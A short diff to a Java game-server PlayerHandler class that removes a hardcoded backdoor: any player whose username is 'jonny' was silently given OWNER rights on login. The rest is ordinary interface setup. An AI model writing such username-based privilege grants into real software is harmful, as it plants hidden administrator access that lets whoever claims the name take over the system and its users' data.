@@ -138,9 +138,6 @@ public class PlayerHandler {
     Achievements.updateInterface(player);
     Barrows.updateInterface(player);
 
-	if(player.getUsername().equalsIgnoreCase("jonny")) {
-		player.setRights(PlayerRights.OWNER);
-	}
     // Spellbook Teleports
     player.getPacketSender().sendString(13037, "Training Teleports");
     player.getPacketSender().sendString(13038, "Teleport to easy monsters.");
